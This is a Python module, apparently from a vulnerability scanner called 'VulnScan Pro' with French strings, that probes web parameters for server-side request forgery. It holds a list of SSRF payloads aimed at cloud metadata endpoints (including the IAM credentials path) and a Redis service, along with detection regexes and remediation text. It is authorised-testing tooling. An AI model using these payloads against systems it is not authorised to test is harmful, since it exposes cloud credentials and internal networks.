"""
Module VulnScan Pro : ssrf_scanner
Teste les vulnérabilités Server-Side Request Forgery (SSRF) en injectant des
adresses internes (169.254.169.254, localhost, 127.0.0.1) dans les paramètres.

AVERTISSEMENT : À utiliser uniquement sur des cibles autorisées.
"""
import sys
import json
import argparse
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests

sys.path.insert(0, '..')
from core.base_module import BaseModule


SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://metadata.google.internal/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/iam/",
    "dict://localhost:6379/info",
]

SSRF_URL_PARAMS = [
    "url", "link", "redirect", "next", "target", "dest", "destination",
    "return", "returnUrl", "callback", "continue", "goto", "redir",
    "img", "image", "src", "source", "file", "path", "fetch", "load",
    "proxy", "forward", "uri", "href", "endpoint",
]

SSRF_SIGNATURES = [
    r"ami-id",
    r"instance-id",
    r"169\.254\.169\.254",
    r"metadata",
    r"ec2",
    r"aws",
    r"iam",
    r"localhost",
    r"\+OK",                  # Redis
    r"REDIS",
    r"refused",
    r"Connection refused",
]

SSRF_REFS = [
    "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
    "https://cwe.mitre.org/data/definitions/918.html",
    "https://portswigger.net/web-security/ssrf",
    "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
]

SSRF_RE = re.compile("|".join(SSRF_SIGNATURES), re.IGNORECASE)


class Module(BaseModule):

    def run(self, url: str, depth: str = "normal", timeout: int = 30) -> dict:
        start = time.time()
        vulns = []
        seen = set()
        req_timeout = min(timeout, 10)

        try:
            session = requests.Session()
            session.headers["User-Agent"] = "VulnScan-Pro/1.0"
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # 1. Test existing GET params
            for param in list(params.keys()):
                if param in seen:
                    continue
                for payload in SSRF_PAYLOADS[:5]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        resp = session.get(test_url, timeout=req_timeout, allow_redirects=False)
                        if SSRF_RE.search(resp.text) or resp.status_code in (301, 302) and "169.254" in resp.headers.get("Location", ""):
                            seen.add(param)
                            vulns.append(self.vuln(
                                name="Server-Side Request Forgery (SSRF) détecté",
                                severity="HIGH",
                                cvss_score=8.6,
                                cvss_vector="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
                                cwe_id="CWE-918",
                                endpoint=url,
                                parameter=param,
                                payload=payload,
                                description=(
                                    f"Le paramètre '{param}' est vulnérable au SSRF. "
                                    f"Le serveur a effectué une requête vers '{payload}' "
                                    "et la réponse contient des données de l'infrastructure interne."
                                ),
                                impact="Accès aux métadonnées cloud (AWS/GCP/Azure), scan réseau interne, pivot d'infrastructure.",
                                evidence=f"Réponse contient des signatures cloud/réseau interne après injection de '{payload}' dans '{param}'.",
                                recommendation=(
                                    "Valider et restreindre les URLs acceptées par whitelist. "
                                    "Bloquer les plages d'adresses internes (RFC1918, 169.254.x.x). "
                                    "Implémenter un proxy sortant avec filtrage des destinations."
                                ),
                                references=SSRF_REFS,
                            ))
                            break
                    except requests.exceptions.RequestException:
                        continue
                if depth == "fast" and (time.time() - start) > 15:
                    break

            # 2. Probe common SSRF-prone params if not in URL
            if depth != "fast":
                for param_name in SSRF_URL_PARAMS[:8]:
                    if param_name in seen or param_name in params:
                        continue
                    for payload in SSRF_PAYLOADS[:3]:
                        test_url = f"{url}{'&' if '?' in url else '?'}{param_name}={requests.utils.quote(payload, safe='')}"
                        try:
                            resp = session.get(test_url, timeout=req_timeout, allow_redirects=False)
                            if SSRF_RE.search(resp.text):
                                seen.add(param_name)
                                vulns.append(self.vuln(
                                    name="Server-Side Request Forgery (SSRF) détecté",
                                    severity="HIGH",
                                    cvss_score=8.6,
                                    cvss_vector="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
                                    cwe_id="CWE-918",
                                    endpoint=url,
                                    parameter=param_name,
                                    payload=payload,
                                    description=(
                                        f"Le paramètre '{param_name}' provoque le serveur à "
                                        f"effectuer une requête vers '{payload}'. "
                                        "Des données de l'infrastructure cloud interne ont été exposées."
                                    ),
                                    impact="Accès aux métadonnées cloud (AWS/GCP/Azure), scan réseau interne, pivot d'infrastructure.",
                                    evidence=f"Réponse contient des signatures cloud/réseau interne après injection de '{payload}' dans '{param_name}'.",
                                    recommendation=(
                                        "Valider les URLs par whitelist. "
                                        "Bloquer les accès aux métadonnées cloud (169.254.169.254). "
                                        "Utiliser des IAM roles restrictifs."
                                    ),
                                    references=SSRF_REFS,
                                ))
                                break
                        except requests.exceptions.RequestException:
                            continue
                    if (time.time() - start) > timeout * 0.8:
                        break

        except Exception as e:
            duration = int((time.time() - start) * 1000)
            return self.error("ssrf_scanner", str(e), duration)

        duration = int((time.time() - start) * 1000)
        return self.result("ssrf_scanner", vulns, duration)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VulnScan Pro — SSRF Scanner")
    parser.add_argument("--url",     required=True,        help="URL cible")
    parser.add_argument("--depth",   default="normal",     help="Profondeur du scan")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout en secondes")
    args = parser.parse_args()

    module = Module()
    result = module.run(args.url, args.depth, args.timeout)
    print(json.dumps(result, ensure_ascii=False))
